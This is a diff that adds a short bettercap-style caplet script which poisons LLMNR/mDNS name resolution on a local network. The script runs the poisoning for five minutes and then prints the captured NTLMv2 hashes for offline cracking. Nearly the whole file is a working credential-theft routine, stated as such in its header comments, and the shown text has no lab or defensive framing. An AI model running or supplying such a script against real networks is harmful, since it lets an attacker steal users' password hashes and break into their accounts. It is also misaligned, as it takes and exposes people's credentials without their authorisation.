@@ -1,0 +1,14 @@
+# ntlm-capture.caplet — Capture NTLMv2 hashes via LLMNR poisoning
+# Poisons LLMNR/mDNS to capture NTLMv2 hashes for offline cracking.
+
+# Start LLMNR poisoning
+on llmnr.poison
+
+# Run for 5 minutes
+sleep 300
+
+# Stop poisoning
+off llmnr.poison
+
+# Show captured NTLM hashes
+creds.show
